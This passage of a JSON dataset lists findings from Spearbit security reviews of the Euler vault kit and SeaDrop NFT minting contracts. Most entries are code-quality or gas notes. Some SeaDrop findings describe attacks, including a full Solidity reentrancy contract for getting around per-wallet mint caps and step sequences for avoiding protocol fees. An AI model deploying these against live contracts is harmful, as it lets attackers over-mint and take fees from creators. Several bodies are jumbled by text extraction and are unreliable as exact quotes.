        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "At interestAccruedFromCache, when the timestamps are equal (timePassed = totalDuration) we would also return interestLeft. Therefore, by modifying the same block we will return the same value without doing extra operations.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "English dialect inconsistencies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "A common best practice is to use one language and dialect for the sake of consistency, readability and maintainability. For example: \"utilisation\" (british) with \"s\" is used, while in another place \"utilize\" (american) with \"z\". Then, in another part is used \"initialize\" (american), etc...",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "ESynth mints are centralized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "setCapacity is an admin function that will set the maximum capacity of mints an address can have, allowing or disallowing users to mint this way. As the admin is the one who first allows users to mint, this should not be a problem. However, if for any strange reason someone who initially is set to any non-zero capacity tries to mint, and the admin wants to DoS them by setting it to 0 capacity, they will avoid that person from minting any token, effectively \"banning\" this person from minting. The logic is as follows: function setCapacity(address minter, uint128 capacity) external onlyOwner { minters[minter].capacity = capacity; emit MinterCapacitySet(minter, capacity); } And later checked at mint that will revert if not enough capacity is set: if ( amount > type(uint128).max - minterCache.minted || minterCache.capacity < uint256(minterCache.minted) + amount ) { } revert E_CapacityReached();",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "PegStabilityModule swapToUnderlyingGivenIn and swapToSynthGivenIn should early return/revert when amountOut is 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Due to rounding down, amountOut could be equal to 0 and it could therefore early return or revert to cut unnecessary actions and event emissions.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Named imports provide more readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The use of named imports from Solidity files provides clarity and readability. Named imports make it immediately clear which specific functions, contracts, or variables are being utilized from a particular module, reducing ambiguity and making the code easier to understand and maintain. For example in LTVUtils: \"./types/Types.sol\"; import \"./types/Types.sol\"; should be import {ConfigAmount} from",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent naming decreases the codebase searchability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Consistency is key for a more searchable and maintainable system, either for users, developers, researchers, etc... To know what to look for within the codebase just by a consistent naming, and to understand faster how things should behave. Some instances of these include:  Functions like toUint be changed to toUint256, or their counterparts, toSharesDownUint256 to toShares- DownUint.  governor be changed to governAdmin, or upgradeAdmin just to admin.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Helper retriever functions can return dummy data",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The use of public push functions (createVault, createProxy) with no access control and without their counterpart pop function to remove unnecessary elements, can lead to an array full of dummy data that later is iterated in order to create some sort of pagination. These arrays are used as helpers for lens-type contracts. This shouldn't be a problem in this case as both start and end items are set. Therefore, under common circum- stances there won't be an out-of-gas scenario (maybe in the case of special case end == type(uint256).max or in a bad setup). However, if someone wants to fill between real vaults or proxys values with dummy data, they are able to do so, and external reads would need to filter this data.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unclear naming can lead to misinterpretation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Naming is key for understanding different parts of the code with just one look, indeed, wrong naming can lead to wrong assumptions of what the code is going to behave. Different instances can be improved for a better understanding:  hasControllerEnabled doesn't check if this contract is the account's controller, but if there are any controller enabled. It is used correctly but could be renamed to hasAnyControllerEnabled to avoid misinterpretation.  The term collateralValue is used ambiguously in Liquidation.sol to represent both the unadjusted and adjusted values of collateral. collateralValue should only be called like that when it represents the value, in units of account, of the full collateral. Consider renaming collateralValue to collateralAdjustedValue (or similar) when the collateral value (in units of account) is adjusted by the LTV.  amount refers to multiple things over the codebase. Sometimes it refers to shares, sometimes to assets (depending on the context) what leads to a much more less consistent and harder to read codebase (as every instance may be a different thing).",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "\"Magic numbers\" should be defined as constants to improve readability and maintainability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Numbers not defined as constants are less maintainable and readable. Changing them with mean- ingfully named constants and with proper @dev comments, would ease the read, search and maintainability.  LiquidityUtils.sol#L119: 1e4 should be CONFIG_SCALE.  IRMSynth.sol#L67: 1e18 should be TARGET_QUOTE. Should have a named constant:  Cache.sol#L96: 1e4 << INTERNAL_DEBT_PRECISION_SHIFT when feeAssets are calculated. 51  Cache.sol#L80: 1e27 as input when RPow.rpow is executed.  Cache.sol#L86: 1e27 when newInterestAccumulator is calculated.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused libraries",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Several libraries were left behind after some updates and are not used anymore. Unused code increases the overall complexity of the codebase, making it harder to maintain and read.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Event emission can track previous admin role for better monitoring",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "SetAdmin event logs the new admin for PoolConfig. To improve tracking and monitoring, consider also logging the current admin who initiated the change. function setAdmin(address newAdmin) external onlyAdmin { if (newAdmin == address(0)) revert E_InvalidAdmin(); admin = newAdmin; emit SetAdmin(newAdmin); } The same can be applied to SetUpgradeAdmin event to log the new upgrade admin.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "isValidInterestFee validation can be skipped",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The documentation should be expanded by explaining that isValidInterestFee validation will be skipped by Governance if the interestFee is updated via Governance.setInterestFee, and will be between the bounds (GUARANTEED_INTEREST_FEE_MIN, GUARANTEED_INTEREST_FEE_MAX). If that's the case, the boundaries imposed by the ProtocolConfig are skipped.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "VaultCreated event can be enhanced for better monitoring",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The makeNewVaultInternal function performs an event emission that doesn't fully capture all of the relevant inputs. Consider including all inputs (upgradeable, asset, oracle, unitOfAccount) and the value set for CFG_EVC_COMPATIBLE_ASSET. function makeNewVaultInternal(bool upgradeable, address asset, address oracle, address unitOfAccount) ,! { returns (IEVault) // ... emit VaultCreated(newVault, asset, upgradeable); }",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Event emission in createVault can be improved",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The function makeNewVaultInternal emits an event, which provides valuable tracking information. A similar event could be emitted at createVault to track the creation of the vault with its specified parameters.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing safety checks can lead to undesired behavior",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "In different contract constructors and some setters, different addresses are set to a variable without checking whether these addresses are non-zero, or if they represent deployed contracts. This contrasts with the approach in other contracts where such safety checks are implemented. Ignoring these checks could lead to some undesired behavior:  Core.sol constructor sanity checks:  governor_ !== address(0)  feeReceiver_ !== address(0)  BaseProductLine.sol constructor sanity checks:  vaultFactory_ !== address(0)  evc_ !== address(0)  BaseProductLine.sol makeNewVaultInternal fast revert check:  asset !== address(0) makeNewVaultInternal can include a check to fast revert rather than waiting for isEVCCompatible to revert.  Core.sol createVault safety checks:  oracle!== address(0)  unitOfAccount!== address(0)",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing/wrong comments and typos",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Comments help to provide context and documentation on what different functions, contracts and variables do. Providing clear and precise comments is key to a clean and maintainable codebase. See below a list of related nitpicks:  Missing comments:  GenericFactory.sol#L133 and BaseProductLine.sol#L86 should be documented and explain that the special case where end == type(uint256).max exists.  BorrowUtils.sol#L66 an inline comment would be useful to explain the logic.  AddressUtils.sol#L8 should provide comments regarding the cases in which checkContract won't work as expected by the function name due to the check of code.length on contracts that, for example, are not yet deployed.  Unclear comments:  AssetTransfers.sol#L25-28 the comment could list and explain with more detail all the possible revert scenarios.  Governance.sol#L213 add some extra comments regarding how origLTV.getLTV(true) returns the \"current\" LTV (based on ramping config) and not the target LTV under the ramping mode scenario.  Wrong comments: 54  Cache.sol#L39-L40 MarkeStorage (a misspelled ancestor name) is used instead of VaultStorage.  Dispatch.sol#L66 the comment states that no code will run before delegating to module. How- ever, it does not take into account the callThroughEVC modifier that was used previously to use modifier in functions like mint, withdraw, redeem, skim, borrow, repay, loop, etc...  IEVault.sol#L365 includes a stale comment, items in a list can't be duplicated right now.  LTVConfig.sol#L44 timeRemaining < rampDuration should be timeRemaining <= rampDuration.  Typos:  ProtocolConfig.sol#L9 bech should be be.  Constants.sol#L10 enusure should be ensure.  Events.sol#L26 initiaiting should be initiating.  Events.sol#L29 recipt should be receipt.  Events.sol#L36 receiver should be the receiver.  Events.sol#L82-L83 transfered should be transferred.  BalanceForwarder.sol#L12 a with should be with a.  ERCCollateral.sol#L21, Dispatch.sol#L136, RiskManager.sol#L64, RiskManager.sol#L84, VaultStorage.sol#L24 re-entrancy should be reentrancy.  Natspec @return missing:  The IERC20 Interface is missing the NatSpec @return.  Natspec missing:  GenericFactory.sol  PegStabilityModule.sol",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Liquidation Invariants",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Euler uses different LTV configurations as well as different prices for liquidation and borrowing Borrows are accepted when healthScore(borrow) > 1.0, and liquidations are performed calculations. when healthScore(x) := collateralValue(x) * getLTV(x) / liabilityValue(x). It's important that an accepted health check when borrowing does not immediately lead to an unhealthy position regarding liquidation checks. We can prove this by showing healthScore(liquidation) >= healthScore(borrow).  getLTV invariant: The following holds for getLTV: getLTV(borrowing) <= getLTV(liquidation) Proof: From the code we can distinguish the cases: 1. targetLTV >= originalLTV: getLTV(borrowing) = getLTV(liquidation) = targetLTV. 2. targetLTV < originalLTV: getLTV(borrowing) = targetLTV <= lerp(originalLTV, targetLTV) = getLTV(liquidation). 55  Health invariant: The following holds for healthScore(x): healthScore(borrow) <= healthScore(liquidation) Proof: collateralValue(borrow) * getLTV(borrow) / liabilityValue(borrow) <= collateralValue(liquidation) * getLTV(liquidation) / liabilityValue(liquidation) This follows from: 1. collateralValue(borrow) <= collateralValue(liquidation) as borrow uses bid prices compared to liq- uidations using the mid price. 2. liabilityValue(borrow) >= liabilityValue(liquidation) as borrow uses ask prices compared to liq- uidations using the mid price. 3. getLTV(borrowing) <= getLTV(liquidation) by the getLTV invariant. The oracles need to guarantee that liquidations",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "ERC721SeaDrop's modifier onlyOwnerOrAdministrator would allow either the owner or the admin to override the other person's config parameters.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The following 4 external functions in ERC721SeaDrop have the onlyOwnerOrAdministrator modifier which allows either one to override the other person's work.  updateAllowedSeaDrop  updateAllowList  updateDropURI  updateSigner That means there should be some sort of off-chain trust established between these 2 entities. Otherwise, there are possible vectors of attack. Here is an example of how the owner can override AllowListData.merkleRoot and the other fields within AllowListData to generate proofs for any allowed SeaDrop's mintAllowList endpoint that would have MintParams.feeBps equal to 0: 1. The admin calls updateAllowList to set the Merkle root for this contract and emit ERC721SeaDrop.updateAllowList: SeaDrop.sol#L827 the other parameters as logs. for an allowed SeaDrop implementation The SeaDrop endpoint being called by 2. The owner calls updateAllowList but this time with new parameters, specifically a new Merkle root that is computed from leaves that have MintParams.feeBps == 0. 3. Users/minters use the generated proof corresponding to the latest allow list update and pass their mintParams.feeBps as 0. And thus avoiding the protocol fee deduction for the creatorPaymentAddress (SeaDrop.sol#L187-L194).",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Reentrancy of fee payment can be used to circumvent max mints per wallet check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "In case of a mintPublic call, the function _checkMintQuantity checks whether the minter has exceeded the parameter maxMintsPerWallet, among other things. However, re-entrancy in the above fee dispersal mechanism can be used to circumvent the check. The following is an example contract that can be employed by the feeRecipent (assume that maxMintsPerWallet is 1): 7 contract MaliciousRecipient { bool public startAttack; address public token; SeaDrop public seaDrop; fallback() external payable { if (startAttack) { startAttack = false; seaDrop.mintPublic{value: 1 ether}({ nftContract: token, feeRecipient: address(this), minterIfNotPayer: address(this), quantity: 1 }); } } // Call `attack` with at least 2 ether. function attack(SeaDrop _seaDrop, address _token) external payable { token = _token; seaDrop = _seaDrop; startAttack = true; _seaDrop.mintPublic{value: 1 ether}({ nftContract: _token, feeRecipient: address(this), minterIfNotPayer: address(this), quantity: 1 }); token = address(0); seaDrop = SeaDrop(address(0)); } } This is especially bad when the parameter PublicDrop.restrictFeeRecipients is set to false, in which case, anyone can circumvent the max mints check, making it a high severity issue. In the other case, only privileged users, i.e., should be part of _allowedFeeRecipients[nftContract] mapping, would be able to circumvent the check--lower severity due to needed privileged access. Also, creatorPaymentAddress can use re-entrancy to get around the same check. See SeaDrop.sol#L571.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Cross SeaDrop reentrancy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The contract that implements IERC721SeaDrop can work with multiple Seadrop implementations, for example, a Seadrop that accepts ETH as payment as well as another Seadrop contract that accepts USDC as payment at the same time. This introduces the risk of cross contract re-entrancy that can be used to circumvent the maxMintsPerWallet check. Here's an example of the attack: 1. Consider an ERC721 token that that has two allowed SeaDrop, one that accepts ETH as payment and the other that accepts USDC as payment, both with public mints and restrictedFeeRecipients set to false. 2. Let maxMintPerWallet be 1 for both these cases. 3. A malicious fee receiver can now do the following:  Call mintPublic for the Seadrop with ETH fees, which does the _checkMintQuantity check and trans- fers the fees in ETH to the receiver.  The receiver now calls mintPublic for Seadrop with USDC fees, which does the _checkMintQuantity check that still passes.  The mint succeeds in the Seadrop-USDC case.  The mint succeeds in the Seadrop-ETH case.  The minter has 2 NFTs even though it's capped at 1. Even if a re-entrancy lock is added in the SeaDrop, the same issue persists as it only enters each Seadrop contract once.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Lack of replay protection for mintAllowList and mintSigned",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "merkle proofs) there are no checks that prevent re-using the same signature or Merkle proof multiple This is indirectly enforced by the _checkMintQuantity function that checks the mint statistics times. using exceeds maxMintsPerWallet. Replays can happen if a wallet does not claim all of maxMintsPerWallet in one transaction. For example, assume that maxMintsPerWallet is set to 2. A user can call mintSigned with a valid signature and quantity = 1 twice. IERC721SeaDrop(nftContract).getMintStats(minter) reverting quantity and the if Typically, contracts try to avoid any forms of signature replays, i.e., a signature can only be used once. This simpli- fies the security properties. In the current implementation of the ERC721Seadrop contract, we couldn't see a way to exploit replay protection to mint beyond what could be minted in a single initial transaction with the maximum value of quantity supplied. However, this relies on the contract correctly implementing IERC721SeaDrop.getMintStats.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The digest in SeaDrop.mintSigned is not calculated correctly according to EIP-712",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "mintParams in the calculation of the digest in mintSigned is of struct type, so we would need to calculate and use its hashStruct , not the actual variable on its own.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ERC721A has mint caps that are not checked by ERC721SeaDrop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "ERC721SeaDrop inherits from ERC721A which packs balance, numberMinted, numberBurned, and an extra data chunk in 1 storage slot (64 bits per substorage) for every address. This would add an inherent cap of 264 (cid:0) 1 to all these different fields. Currently, there is no check in ERC721A's _mint for quantity nor in ERC721SeaDrop's mintSeaDrop function. Also, if we almost reach the max cap for a balance by an owner and someone else transfers a token to this owner, there would be an overflow for the balance and possibly the number of mints in the _packedAddressData. The overflow could possibly reduce the balance and the numberMinted to a way lower numer and numberBurned to a way higher number",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ERC721SeaDrop owner can choose an address they control as the admin when the constructor is called.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The owner/creator can call the contract directly (skip using the UI) and set the administrator as themselves or another address that they can control. Then after they create a PublicDrop or TokenGatedDrop, they can call either updatePublicDropFee or updateTokenGatedDropFee and set the feeBps to  zero  or another number and also call the updateAllowedFeeRecipient to add the same or another address they control as a feeRecipient. This way they can circumvent the protocol fee.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ERC721SeaDrop's admin would need to set feeBps manually after/before creation of each drop by the owner",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "When an owner of a ERC721SeaDrop token creates either a public or a token gated drop by calling updatePublicDrop or updateTokenGatedDrop, the PublicDrop.feeBps/TokenGatedDropStage.feeBps is initially set to 0. So the admin would need to set the feeBps parameter at some point (before or after). Forgetting to set this parameter results in not receiving the protocol fees.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "owner can reset feeBps set by admin for token gated drops",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Only the admin can call updateTokenGatedDropFee to update feeBps. However, the owner can call updateTokenGatedDrop(address seaDropImpl, address allowedNftToken, TokenGatedDropStage calldata drop- Stage) twice after that to reset the feeBps to 0 for a drop. 1. Once with dropStage.maxTotalMintableByWallet equal to 0 to wipe out the storage on the SeaDrop side. 2. Then with the same allowedNftToken address and the other desired parameters, which would retrieve the previously wiped out drop stage data (with feeBps equal to 0). NOTE: This type of attack does not apply to updatePublicDrop and updatePublicDropFee pair. Since updatePub- licDrop cannot remove or update the feeBps. Once updatePublicDropFee is called with a specific feeBps that value remains for this ERC721SeaDrop contract-related storage on SeaDrop (_publicDrops[msg.sender] = pub- licDrop). And any number of consecutive calls to updatePublicDrop with any parameters cannot change the already set feeBps.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Update the start token id for ERC721SeaDrop to 1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "ERC721SeaDrop's mintSeaDrop uses _mint from ERC721A library which starts the token ids for minting from 0. /// contracts/ERC721A.sol#L154-L156 /** * @dev Returns the starting token ID. * To change the starting token ID, please override this function. */ function _startTokenId() internal view virtual returns (uint256) { return 0; }",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Update the ERC721A library due to an unpadded toString() function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The audit repo uses ERC721A at dca00fffdc8978ef517fa2bb6a5a776b544c002a which does not add a trailing zero padding to the returned string. Some projects have had issues reusing the toString() where the off-chain call returned some dirty-bits at the end (similar to Seaport 1.0's name()).",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Warn contracts implementing IERC721SeaDrop to revert on quantity == 0 case",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "There are no checks in Seadrop that prevents minting for the case when quantity == 0. This would call the function mintSeadrop(minter, quantity) for a contract implementing IERC721SeaDrop with quantity == 0. It is up to the implementing contract to revert in such cases. The ERC721A library reverts when quantity == 0--the correct behaviour. However, there has been instances in the past where ignoring quantity == 0 checks have led to security issues.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing parameter in _SIGNED_MINT_TYPEHASH",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "A parameter is missing (uint256 maxTokenSupplyForStage) and got caught after reformatting.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing address(0) check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "All update functions having an address as an argument check them against address(0). This is missing in updateTokenGatedDrop. This is also not protected in ERC721SeaDrop.sol#updateTokenGatedDrop(), so address(0) could pass as a valid value.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Low Risk SeaDrop.sol#L856, SeaDrop.sol#L907-L909, SeaDrop.sol#L927-L929, SeaDrop.sol#L966-L968,"
        ]
    },
    {
        "title": "Missing boundary checks on feeBps",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "There's a missing check when setting feeBps from ERC721SeaDrop.sol while one exists when the value is used at a later stage in Seadrop.sol, which could cause a InvalidFeeBps error.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Upgrade openzeppelin/contracts's version",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "There are known vulnerabilities in the current @openzeppelin/contracts version used. This affects SeaDrop.sol with a potential Improper Verification of Cryptographic Signature vulnerability as ECDSA.recover is used.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "struct TokenGatedDropStage is expected to fit into 1 storage slot",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "struct TokenGatedDropStage is expected to be tightly packed into 1 storage slot, as per announced in its @notice tag. However, the struct actually takes 2 slots. This is unexpected, as only one slot is loaded in the dropStageExists assembly check.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Avoid expensive iterations on removal of list elements by providing the index of element to be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Iterating through an array (address[] storage enumeration) to find the desired element (address toRemove) can be an expensive operation. Instead, it would be best to also provide the index to be removed along with the other parameters to avoid looping over all elements. Also note in the case of _removeFromEnumeration(signer, enumeratedStorage), hopefully, there wouldn't be too many signers corresponding to a contract. So practically, this wouldn't be an issue. But something to note. Although the owner or admin can stuff the signer list with a lot of signers as the other person would not be able to remove from the list (DoS attack). For example, if the owner has stuffed the signer list with malicious signers, the admin would not be able to remove them.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "mintParams.allowedNftToken should be cached",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "mintParams.allowedNftToken is accessed several times in the mintAllowedTokenHolder function. It would be cheaper to cache it: // Put the allowedNftToken on the stack for more efficient access. address allowedNftToken = mintParams.allowedNftToken;",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Immutables which are calculated using keccak256 of a string literal can be made constant.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Since Solidity 0.6.12, keccak256 expressions are evaluated at compile-time: Code Generator: Evaluate keccak256 of string literals at compile-time. The suggestion of marking these expressions as immutable to save gas isn't true for compiler versions >= 0.6.12. As a reminder, before that, the occurrences of constant keccak256 expressions were replaced by the expressions instead of the computed values, which added a computation cost.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Combine a pair of mapping to a list and mapping to a mapping into mapping to a linked-list",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "SeaDrop uses 3 pairs of mapping to a list and mapping to a mapping that can be combined into just one mapping. The pairs: 1. _allowedFeeRecipients and _enumeratedFeeRecipients 2. _signers and _enumeratedSigners 3. _tokenGatedDrops and _enumeratedTokenGatedTokens Here we have variables that come in pairs. One variable is used for data retrievals (a flag or a custom struct) and the other for iteration/enumeration. mapping(address => mapping(address => CustomStructOrBool)) private variable; mapping(address => address[]) private _enumeratedVariable;",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The onlyAllowedSeaDrop modifier is redundant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "The onlyAllowedSeaDrop modifier is always used next to another one (onlyOwner, onlyAdminis- trator or onlyOwnerOrAdministrator). As the owner, which is the least privileged role, already has the privilege to update the allowed SeaDrop registry list for this contract (by calling updateAllowedSeaDrop), this makes this second modifier redundant.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Combine _allowedSeaDrop and _enumeratedAllowedSeaDrop in ERC721SeaDrop to save storage and gas.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Combine _allowedSeaDrop and _enumeratedAllowedSeaDrop into just one variable using a cyclic linked-list data structure. This would reduce storage space and save gas when storing or retrieving parameters.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "<array>.length should not be looked up in every loop of a for-loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Reading an array's length at each iteration of a loop consumes more gas than necessary.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "A storage pointer should be cached instead of computed multiple times",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Caching a mapping's value in a local storage variable when the value is accessed multiple times saves gas due to not having to perform the same offset calculation every time.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Comparing a boolean to a constant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Comparing to a constant (true or false) is a bit more expensive than directly checking the returned boolean value.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "mintAllowList, mintSigned, or mintAllowedTokenHolder have an inherent cap for minting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "mintAllowedTokenHolder is stored in a uint40 (after this audit uint32) which limits the maximum token id that can be minted using mintAllowList, mintSigned, or mintAllowedTokenHolder.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider replacing minterIfNotPayer parameter to always correspond to the minter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
        "body": "Currently, the variable minterIfNotPayer is treated in the following way: if the value is 0, then msg.sender would be considered as the minter. Otherwise, minterIfNotPayer would be considered as the minter. The logic can be simplified to always treat this variable as the minter. The 0 can be replaced by setting msg.sender as minterIfNotPayer. The variable should then be renamed as well--we recommend calling it minter afterwards.",
        "labels": [
            "Spearbit",
            "Seadrop",
            "Severity: Informational"
        ]
    },
    {
